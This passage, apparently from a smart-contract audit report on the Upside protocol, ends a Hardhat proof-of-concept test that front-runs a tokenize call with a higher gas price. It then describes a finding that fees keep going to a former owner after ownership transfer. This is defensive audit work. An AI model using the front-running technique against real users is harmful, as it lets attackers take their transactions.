class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e6\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 6 seconds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 1%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    };\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Set fee info\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Turn off auto-mining to simulate pending transactions in the mempool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User1 submits a transaction with normal gas fees\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Low priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User2 submits the same transcation with higher gas price to front-run\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// High priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Mine the transactions, user2\u0026#39;s should be prioritized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_mine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Reactivate auto-mining for normal operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Verify that user1\u0026#39;s transaction failed because the URL was already tokenized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erevertedWithCustomError\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MetaCoinExists\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etimeout\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" style=\"position:relative;\"\u003e\u003ca href=\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" aria-label=\"02 transferring ownership may result in fees being unintentionally paid to the previous owner permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the protocol, the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e is a configurable parameter that determines where tokenization fees are sent when the fee system is enabled. This address is set by the \u003ccode\u003eowner\u003c/code\u003e of the contract using a function \u003ccode\u003esetFeeInfo\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ( \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e\u0026gt;\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eInvalidSetting\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eFeeInfoSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when ownership of the contract is transferred using the standard \u003ccode\u003eOwnable\u003c/code\u003e pattern (e.g., via \u003ccode\u003etransferOwnership()\u003c/code\u003e), the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e does not automatically update to reflect the new owner. As a result, all tokenization fees continue being sent to the previous owner, even though they no longer control the contract. This creates a temporal vulnerability between the point of ownership transfer and the point at which the new owner explicitly updates the fee configuration. If the new owner delays or forgets to call \u003ccode\u003esetFeeInfo\u003c/code\u003e, then fees are still sent to the previous owner.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eOverride the 